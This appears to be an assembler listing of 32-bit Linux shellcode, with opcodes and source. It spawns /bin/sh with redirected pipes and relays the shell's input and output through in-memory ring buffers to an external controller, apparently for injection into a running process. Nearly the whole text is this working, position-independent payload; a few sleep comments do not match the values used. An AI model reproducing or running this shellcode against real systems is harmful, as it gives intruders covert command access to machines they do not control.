     1                                  BITS 32
     2                                  
     3                                  ;		     #   1   2   3   4   5   6
     4                                  ; syscall arguments: EAX EBX ECX EDX ESI EDI EBP
     5                                  ; syscall return: EAX
     6                                  
     7                                  start:
     8 00000000 E800000000              	call near shcode_start
     9                                  shcode_start:
    10 00000005 5D                      	pop	ebp
    11 00000006 81C529020000            	add	ebp, data_start - shcode_start
    12                                  
    13                                  	; pipe(m2sh)
    14 0000000C 31C0                    	xor	eax,eax
    15 0000000E B02A                    	mov	al,42
    16 00000010 89EB                    	mov	ebx,ebp
    17 00000012 81C316000000            	add	ebx,m2sh_0
    18 00000018 CD80                    	int	0x80
    19                                  
    20 0000001A 3D00000000              	cmp	eax,0
    21 0000001F 7524                    	jne	child_dead_interleaved
    22                                  
    23                                  	; pipe(sh2m)
    24 00000021 31C0                    	xor	eax,eax
    25 00000023 B02A                    	mov	al,42
    26 00000025 89EB                    	mov	ebx,ebp
    27 00000027 81C31E000000            	add	ebx,sh2m_0
    28 0000002D CD80                    	int	0x80
    29                                  
    30 0000002F 3D00000000              	cmp	eax,0
    31 00000034 750F                    	jne	child_dead_interleaved
    32                                  
    33                                  	; fork()
    34 00000036 31C0                    	xor	eax,eax
    35 00000038 B002                    	mov	al,2
    36 0000003A CD80                    	int	0x80
    37                                  
    38 0000003C 3D00000000              	cmp	eax,0
    39 00000041 7407                    	je	child
    40 00000043 7F66                    	jg	parent			; signed compare
    41                                  child_dead_interleaved:
    42 00000045 E9AC010000              	jmp	child_dead
    43                                  
    44                                  child:
    45                                  	; dup2(m2sh[0], 0)   (dup to stdin)
    46 0000004A 31C0                    	xor	eax,eax
    47 0000004C B03F                    	mov	al,63
    48 0000004E 8B9D16000000            	mov	ebx,[ebp+m2sh_0]
    49 00000054 31C9                    	xor	ecx,ecx
    50 00000056 CD80                    	int	0x80
    51                                  
    52 00000058 39C8                    	cmp	eax,ecx
    53 0000005A 754A                    	jne	leave_sh_interleaved
    54                                  
    55                                  	; dup2(sh2m[1], 1)   (dup to stdout)
    56 0000005C 31C0                    	xor	eax,eax
    57 0000005E B03F                    	mov	al,63
    58 00000060 8B9D22000000            	mov	ebx,[ebp+sh2m_1]
    59 00000066 41                      	inc	ecx
    60 00000067 CD80                    	int	0x80
    61                                  
    62 00000069 39C8                    	cmp	eax,ecx
    63 0000006B 7539                    	jne	leave_sh_interleaved
    64                                  	
    65                                  	; dup2(sh2m[1], 2)   (dup to stderr)
    66 0000006D 31C0                    	xor	eax,eax
    67 0000006F B03F                    	mov	al,63
    68 00000071 8B9D22000000            	mov	ebx,[ebp+sh2m_1]
    69 00000077 41                      	inc	ecx
    70 00000078 CD80                    	int	0x80
    71                                  
    72 0000007A 39C8                    	cmp	eax,ecx
    73 0000007C 7528                    	jne	leave_sh_interleaved
    74                                  
    75                                  	; execve("/bin/sh", ["/bin/sh",NULL], [NULL])
    76 0000007E 31C0                    	xor	eax,eax
    77 00000080 B00B                    	mov	al,11
    78 00000082 89EB                    	mov	ebx,ebp
    79 00000084 81C309000000            	add	ebx,execve_command		; ebx -> '/bin/sh',0
    80                                  
    81 0000008A 89E9                    	mov	ecx,ebp
    82 0000008C 81C126020000            	add	ecx,foo				; ecx -> foo
    83                                  
    84 00000092 31D2                    	xor	edx,edx
    85 00000094 8919                    	mov	[ecx],ebx			; foo := @'/bin/sh',0
    86 00000096 895104                  	mov	[ecx+4],edx			; bar := NULL
    87 00000099 895108                  	mov	[ecx+8],edx			; baz := NULL
    88 0000009C 89CA                    	mov	edx,ecx
    89 0000009E 81C208000000            	add	edx,8				; edx -> baz
    90 000000A4 CD80                    	int	0x80
    91                                  
    92                                  	; fail if execve did not work.
    93                                  leave_sh_interleaved:
    94 000000A6 E97C010000              	jmp	leave_sh
    95                                  
    96                                  parent:
    97                                  	; remember child's PID
    98 000000AB 898512000000            	mov	[ebp+child_pid],eax
    99                                  
   100                                  	; close(m2sh[0])
   101 000000B1 31C0                    	xor	eax,eax
   102 000000B3 B006                    	mov	al,6
   103 000000B5 8B9D16000000            	mov	ebx,[ebp+m2sh_0]
   104 000000BB CD80                    	int	0x80
   105                                  
   106                                  	; close(sh2m[1])
   107 000000BD 31C0                    	xor	eax,eax
   108 000000BF B006                    	mov	al,6
   109 000000C1 8B9D22000000            	mov	ebx,[ebp+sh2m_1]
   110 000000C7 CD80                    	int	0x80
   111                                  
   112                                  	; clone:
   113                                  	; one thread for reader, one thread for writer
   114 000000C9 31C0                    	xor	eax,eax
   115 000000CB B078                    	mov	al,120
   116                                  	; CLONE_FS   | CLONE_FILES | CLONE_SIGHAND | CLONE_VM   | CLONE_THREAD
   117                                  	; 0x00000200 | 0x00000400  | 0x00000800    | 0x00000100 | 0x00010000
   118                                  	; CLONE_PTRACE = 0x00002000
   119 000000CD BB000F0100              	mov	ebx,0x00010f00
   120 000000D2 89E1                    	mov	ecx,esp	; just use same stack. we don't need the stack, anyway.
   121 000000D4 31D2                    	xor	edx,edx
   122 000000D6 CD80                    	int	0x80
   123                                  
   124 000000D8 3D00000000              	cmp	eax,0
   125                                  	; ret=0 -> clone
   126 000000DD 7407                    	je	thread_write_to_master_interleaved	; clone is writer
   127                                  	; ret>0 -> original
   128 000000DF 7F0A                    	jg	thread_read_from_master			; original is reader
   129                                  	; error if ret<0
   130 000000E1 E910010000              	jmp	child_dead
   131                                  
   132                                  thread_write_to_master_interleaved:
   133 000000E6 E9A4000000              	jmp	thread_write_to_master
   134                                  
   135                                  	; ==================================== the READER thread:
   136                                  thread_read_from_master:
   137                                  	; will write to child via m2sh[1]
   138                                  	; remember RINGBUFFER from_master in esi
   139 000000EB 89EE                    	mov	esi,ebp
   140 000000ED 81C626000000            	add	esi,rfrm_buffer
   141                                  
   142                                  reader_while_fds_ok:
   143                                  	; while both FDs are ok:
   144 000000F3 8A8503000000            	mov	al,[ebp+to_child_ok]
   145 000000F9 028504000000            	add	al,[ebp+from_child_ok]
   146 000000FF 3C02                    	cmp	al,2
   147 00000101 7546                    	jne	leave_sh_second_interleaved
   148                                  
   149                                  	; test, if master requested child to be terminated
   150 00000103 8A8502000000            	mov	al,[ebp+terminate_child]
   151 00000109 3C00                    	cmp	al,0
   152 0000010B 755F                    	jne	do_terminate_child
   153                                  
   154                                  	; if ringbuffer is EMPTY ( _reader == _writer ), do nothing.
   155 0000010D 31C0                    	xor	eax,eax
   156 0000010F 8A8505000000            	mov	al,[ebp+rfrm_writer_pos]
   157 00000115 2A8506000000            	sub	al,[ebp+rfrm_reader_pos]
   158 0000011B 7431                    	jz	reader_sleep
   159                                  
   160                                  	; write a chunk to the child.
   161                                  	; EAX/AL is the number of bytes to be written to the child.
   162 0000011D 31DB                    	xor	ebx,ebx
   163 0000011F 8A9D06000000            	mov	bl,[ebp+rfrm_reader_pos]
   164 00000125 89D9                    	mov	ecx,ebx
   165 00000127 00C1                    	add	cl,al
   166 00000129 38D9                    	cmp	cl,bl
   167 0000012B 7704                    	ja	reader_no_overlap	; writer is behind reader. no overlap
   168                                  
   169 0000012D 31C0                    	xor	eax,eax
   170 0000012F 28C8                    	sub	al,cl			; number of bytes to end of buffer.
   171                                  
   172                                  reader_no_overlap:
   173                                  	; write the data from the ringbuffer to the child
   174 00000131 89C2                    	mov	edx,eax
   175 00000133 31C0                    	xor	eax,eax
   176 00000135 B004                    	mov	al,4
   177 00000137 01F3                    	add	ebx,esi		; EBX points to position in buffer where the to-be-written data resides
   178 00000139 8B8D1A000000            	mov	ecx,[ebp+m2sh_1]
   179 0000013F CD80                    	int	0x80
   180                                  
   181                                  	; mark chunk as read
   182 00000141 009506000000            	add	[ebp+rfrm_reader_pos], dl
   183 00000147 EBAA                    	jmp	reader_while_fds_ok
   184                                  
   185                                  leave_sh_second_interleaved:
   186 00000149 E9D9000000              	jmp	leave_sh
   187                                  
   188                                  reader_sleep:
   189                                  	; sleep 0.001 seconds:
   190                                  	; usleep(0,1000000);
   191 0000014E 31C0                    	xor	eax,eax
   192 00000150 B0A2                    	mov	al, 162
   193 00000152 89EB                    	mov	ebx, ebp
   194 00000154 81C326020000            	add	ebx, foo
   195 0000015A 89D9                    	mov	ecx, ebx
   196 0000015C 31D2                    	xor	edx,edx
   197 0000015E 8913                    	mov long [ebx], edx		; seconds
   198 00000160 BAA0860100              	mov	edx,100000
   199 00000165 895304                  	mov long [ebx+4], edx		; nanoseconds
   200 00000168 CD80                    	int	0x80
   201                                  
   202 0000016A EB87                    	jmp	reader_while_fds_ok
   203                                  
   204                                  do_terminate_child:
   205                                  	; send a SIGKILL to child
   206 0000016C 31C0                    	xor	eax,eax
   207 0000016E B025                    	mov	al,37
   208 00000170 8B9D12000000            	mov	ebx,[ebp+child_pid]
   209 00000176 31C9                    	xor	ecx,ecx
   210 00000178 B109                    	mov	cl,9	; SIGKILL
   211 0000017A CD80                    	int	0x80
   212                                  
   213                                  	; clear to_child_ok
   214 0000017C 31C0                    	xor	eax,eax
   215 0000017E 898503000000            	mov	[ebp+to_child_ok], eax
   216                                  	; and from_child_ok
   217 00000184 898504000000            	mov	[ebp+from_child_ok], eax
   218 0000018A E998000000              	jmp	leave_sh
   219                                  
   220                                  	; ==================================== the WRITER thread:
   221                                  thread_write_to_master:
   222                                  	; will read from child via sh2m[0]
   223                                  	; remember RINGBUFFER to_master in esi
   224 0000018F 89EE                    	mov	esi,ebp
   225 00000191 81C626010000            	add	esi,rto_buffer
   226                                  
   227                                  writer_while_fds_ok:
   228                                  	; while both FDs are ok:
   229 00000197 8A8503000000            	mov	al,[ebp+to_child_ok]
   230 0000019D 028504000000            	add	al,[ebp+from_child_ok]
   231 000001A3 3C02                    	cmp	al,2
   232 000001A5 754F                    	jne	child_dead
   233                                  
   234                                  	; if ringbuffer is FULL ( _reader == _writer+1 ), do nothing.
   235 000001A7 8A8507000000            	mov	al,[ebp+rto_writer_pos]
   236 000001AD FEC0                    	inc	al
   237 000001AF 2A8508000000            	sub	al,[ebp+rto_reader_pos]
   238 000001B5 7421                    	jz	writer_sleep
   239                                  
   240                                  	; read ONE SINGLE BYTE and pass it into the buffer.
   241 000001B7 31C0                    	xor	eax,eax
   242 000001B9 B003                    	mov	al,3
   243 000001BB 8B9D1E000000            	mov	ebx,[ebp+sh2m_0]
   244 000001C1 31C9                    	xor	ecx,ecx
   245 000001C3 8A8D07000000            	mov	cl,[ebp+rto_writer_pos]
   246 000001C9 01F1                    	add	ecx,esi
   247 000001CB 31D2                    	xor	edx,edx
   248 000001CD 42                      	inc	edx
   249 000001CE CD80                    	int	0x80
   250                                  
   251 000001D0 FE8507000000            	inc byte [ebp+rto_writer_pos]
   252                                  
   253                                  	; we don't need to sleep inside the loop. only sleep, if ringbuffer is full.
   254                                  	; read() will block if there is no data from child.
   255 000001D6 EBBF                    	jmp	writer_while_fds_ok
   256                                  
   257                                  writer_sleep:
   258                                  	; sleep 0.001 seconds:
   259                                  	; usleep(0,1000000);
   260 000001D8 31C0                    	xor	eax,eax
   261 000001DA B0A2                    	mov	al, 162
   262 000001DC 89EB                    	mov	ebx, ebp
   263 000001DE 81C326020000            	add	ebx, foo
   264 000001E4 89D9                    	mov	ecx, ebx
   265 000001E6 31D2                    	xor	edx,edx
   266 000001E8 8913                    	mov long [ebx], edx		; seconds
   267 000001EA BAA0860100              	mov	edx,100000
   268 000001EF 895304                  	mov long [ebx+4], edx		; nanoseconds
   269 000001F2 CD80                    	int	0x80
   270                                  
   271 000001F4 EBA1                    	jmp	writer_while_fds_ok
   272                                  
   273                                  	; ==================================================================
   274                                  
   275                                  child_dead:
   276                                  	; at most wait 2 seconds for master's ACK
   277 000001F6 31C0                    	xor	eax,eax
   278 000001F8 388501000000            	cmp	[ebp+child_is_dead_ACK], al
   279 000001FE 7527                    	jne	leave_sh
   280 00000200 B002                    	mov	al,2
   281 00000202 388500000000            	cmp	[ebp+child_is_dead], al
   282 00000208 771D                    	ja	leave_sh
   283                                  
   284 0000020A FE4500                  	inc byte [ebp]
   285                                  
   286                                  	; usleep(1,0):
   287 0000020D 31C0                    	xor	eax,eax
   288 0000020F B0A2                    	mov	al, 162
   289 00000211 89EB                    	mov	ebx, ebp
   290 00000213 81C326020000            	add	ebx, foo
   291 00000219 89D9                    	mov	ecx, ebx
   292 0000021B 31D2                    	xor	edx,edx
   293 0000021D 895304                  	mov long [ebx+4], edx		; nanoseconds
   294 00000220 42                      	inc	edx
   295 00000221 8913                    	mov long [ebx], edx		; seconds
   296 00000223 CD80                    	int	0x80
   297                                  
   298 00000225 EBCF                    	jmp	child_dead
   299                                  
   300                                  leave_sh:
   301                                  	; exit-point for BOTH parent:writer&reader and child in case of fail
   302 00000227 31C0                    	xor	eax,eax
   303 00000229 89C3                    	mov	ebx,eax
   304 0000022B 40                      	inc	eax
   305 0000022C CD80                    	int	0x80
   306                                  
   307                                  ; =============================================================================
   308                                  ; DATA
   309                                  data_start EQU $
   310                                  
   311                                  ; do not change order of the following stuff!
   312                                  
   313                                  child_is_dead EQU $ - data_start
   314 0000022E 00                      	db		0
   315                                  child_is_dead_ACK EQU $ - data_start
   316 0000022F 00                      	db		0
   317                                  
   318                                  terminate_child	EQU $ - data_start
   319 00000230 00                      	db		0
   320                                  
   321                                  to_child_ok EQU $ - data_start
   322 00000231 01                      	db		1
   323                                  from_child_ok EQU $ - data_start
   324 00000232 01                      	db		1
   325                                  
   326                                  ; a ringbuffer is EMPTY, if both _writer and _reader point to the same location.
   327                                  ; a ringbuffer is FULL, if _reader == _writer+1
   328                                  
   329                                  ; ringbuffer from_master:
   330                                  
   331                                  rfrm_writer_pos EQU $ - data_start
   332 00000233 00                      	db		0
   333                                  rfrm_reader_pos EQU $ - data_start
   334 00000234 00                      	db		0
   335                                  
   336                                  ; ringbuffer to_master:
   337                                  
   338                                  rto_writer_pos EQU $ - data_start
   339 00000235 00                      	db		0
   340                                  rto_reader_pos EQU $ - data_start
   341 00000236 00                      	db		0
   342                                  
   343                                  execve_command EQU $ - data_start
   344 00000237 2F62696E2F736800        	db	'/bin/sh',0
   345                                  
   346                                  ; =============================================================================
   347                                  ; stuff that is not required to be initialized:
   348 0000023F 90                      align 4
   349                                  
   350                                  child_pid EQU $ - data_start
   351                                  
   352                                  ; pipes middleman<->shell
   353                                  m2sh_0 EQU $ - data_start + 4			; shell reads
   354                                  m2sh_1 EQU $ - data_start + 8			; master writes
   355                                  sh2m_0 EQU $ - data_start + 12			; master reads
   356                                  sh2m_1 EQU $ - data_start + 16			; shell writes
   357                                  
   358                                  rfrm_buffer EQU $ - data_start + 20		; FROM master
   359                                  rto_buffer EQU $ - data_start + 276		; TO master
   360                                  
   361                                  foo EQU $ - data_start + 532
   362                                  bar EQU $ - data_start + 536
   363                                  baz EQU $ - data_start + 540
   364                                  qux EQU $ - data_start + 544
   365                                  
